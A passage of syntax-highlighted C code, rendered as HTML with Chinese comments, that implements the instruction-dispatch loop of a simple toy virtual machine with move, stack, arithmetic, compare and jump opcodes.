1</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>     vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将 HLT 指令写入虚拟机内存中，作为程序的结束标志</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">return</span> len<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 返回程序长度（包含 HLT 指令）</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\">// 定义一个执行函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> src<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>running<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环执行，直到运行状态为 0</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token class-name\">uint8_t</span> op <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 从内存中读取当前指令</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 根据指令类型进行分支处理</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">case</span> MOV<span class=\"token operator\">:</span> <span class=\"token comment\">// 移动数据 </span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span>dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将源寄存器的值赋给目标寄存器</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> src<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将目标值赋给目标寄存器</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将程序计数器增加 4（跳过指令和操作数）</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">case</span> PUSH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">--</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">case</span> POP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> ALU<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 加法</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 减法</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 乘法</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 异或</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> CMP<span class=\"token operator\">:</span><span class=\"token comment\">// 比较的是后面 2 个操作数代表的寄存器的值</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JMP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JNE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> JE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>            <span class=\"token keyword\">case</span> 